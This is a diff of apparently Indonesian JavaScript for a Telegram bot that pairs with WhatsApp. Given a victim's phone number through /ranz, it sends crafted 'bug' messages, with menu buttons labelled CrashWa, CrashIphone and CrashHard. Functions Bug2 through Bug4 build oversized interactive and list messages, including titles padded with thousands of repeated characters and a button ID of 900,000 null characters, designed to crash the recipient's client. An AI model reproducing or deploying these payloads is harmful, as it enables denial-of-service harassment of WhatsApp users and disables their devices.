@@ -16,7 +16,7 @@ function isPremium(userId) {
   return premiumUsers.includes(userId.toString());
 }
 const cooldowns = new Map();
-const COOLDOWN_TIME = 80 * 1000; // 60 detik
+const COOLDOWN_TIME = 80 * 5000; // 60 detik
 const crypto = require("crypto");
 const path = require("path");
 const token = config.BOT_TOKEN;
@@ -192,7 +192,7 @@ async function connectToWhatsApp(botNumber, chatId) {
             `╭─────────────────
 │    *KODE PAIRING*    
 │────────────────
-│ Bot: ${botNumber}
+│ BOT: ${botNumber}
 │ Kode: ${formattedCode}
 ╰─────────────────`,
             {
@@ -400,7 +400,7 @@ async function Bug2(sock, jid) {
               },
             },
             body: {
-              text: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
+              text: "ㅤㅤㅤㅤㅤ",
             },
             nativeFlowMessage: {
               buttons: [
@@ -459,7 +459,7 @@ async function Bug4(sock, jid) {
     viewOnceMessage: {
       message: {
         listResponseMessage: {
-          title: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )𐎟 ♨️" + "ꦽ".repeat(9740),
+          title: "ㅤㅤㅤㅤㅤ" + "ㅤ".repeat(9740),
           listType: 2,
           singleSelectReply: {
             selectedRowId: "⚡",
@@ -494,7 +494,7 @@ async function Bug4(sock, jid) {
                   {
                     buttonId: "\u0000".repeat(900000),
                     buttonText: {
-                      displayText: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )𐎟 ♨️",
+                      displayText: "ㅤㅤㅤㅤㅤ",
                     },
                     type: 1,
                   },
@@ -605,11 +605,11 @@ async function Bug3(sock, jid) {
         message: {
           interactiveMessage: {
             header: {
-              title: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
+              title: "ㅤㅤㅤㅤㅤ",
               hasMediaAttachment: false,
             },
             body: {
-              text: "𝗨𝗻𝗱𝗲𝗿𝗰𝗿𝗮𝘀𝗵",
+              text: "ㅤㅤㅤㅤㅤ",
             },
             nativeFlowMessage: {
               messageParamsJson: "",
@@ -1194,7 +1194,7 @@ bot.on("callback_query", (callbackQuery) => {
 │
 │ Command List:
 │
-│ • /nagato
+│ • /ranz
 │   menampilkan button bug
 │   Contoh: /ranz 628xx
 │
@@ -1288,11 +1288,31 @@ bot.onText(/\/ranz (\d+)/, async (msg, match) => {
         [{ text: "፠Cr⃢ash⃢Wa", callback_data: `notag_${jid}` }],
         [{ text: "⏚CrashIphone⏎", callback_data: `os_${jid}` }],
         [{ text: "✈CrashHard✇", callback_data: `manuver_${jid}` }],
-        [{ text: "Unli✘Mited", callback_data: `unlimited_${jid}` }],
-        [{ text: "➷SepecialyUi➹", callback_data: `combox_${jid}` }],
       ],
     },
   });
+});
+
+const checkChatType = (msg, next) => {
+  if (botForGroup && msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') {
+    msg.reply('❌ Command ini hanya dapat digunakan di grup.');
+    return;
+  }
+
+  if (botForPrivateChat && msg.chat.type !== 'private') {
+    msg.reply('❌ Command ini hanya dapat digunakan di private chat.');
+    return;
+  }
+
+  next(); // Melanjutkan ke handler berikutnya jika lolos pengecekan
+};
+bot.use((msg, next) => {
+  // Set variabel global untuk menentukan tipe bot
+  botForGroup = true; // Hanya untuk grup
+  botForPrivateChat = false; // Tidak untuk private chat
+
+  // Gunakan middleware
+  checkChatType(msg, next);
 });
 
 bot.on("callback_query", async (callbackQuery) => {
